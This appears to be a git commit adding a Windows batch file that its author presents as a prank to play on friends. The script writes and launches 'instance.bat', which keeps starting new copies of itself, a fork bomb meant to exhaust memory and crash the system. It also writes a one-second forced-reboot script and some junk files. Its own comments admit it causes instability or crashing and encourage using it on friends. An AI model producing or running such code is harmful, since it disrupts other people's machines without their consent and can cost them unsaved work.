4c7d6488e71ef25597ddfcef3a791d27f7cbad21
Barnacl437 <terragodof@gmail.com>
2023-11-03 11:08:39 +0700

    Alternative file created

---
+++ l0l-alt.bat
@@ -0,0 +1,22 @@
+:this is an alternative, 'updated' Batch script with some useless things added to make it more pro and disk space consuming (not much)
+@echo off
+echo this is a trolley script to simulate how a virus multiplies itself into the memory zone.
+pause
+echo this may cause system instability or crashing without actually affecting data in harddisk,
+echo so you can use it to troll your friend, but friendly reminding: do it with care.
+pause
+echo now start...
+timeout 2
+echo start instance.bat > instance.bat
+echo 
+echo shutdown /r -t 1 > emergen-reboot.bat
+echo [dotfile] > dotfile.txt
+echo trolleyMode=on > dotfile.txt
+echo ensuringInfiniteGeneraion=enabled > dotfile.txt
+echo 1> fillout.txt
+echo 2> fillout2.txt
+echo 3> fillout3.txt
+echo 4> fillout4.txt
+echo 5> fillout5.txt
+echo 10> fillout10.txt
+start instance.bat
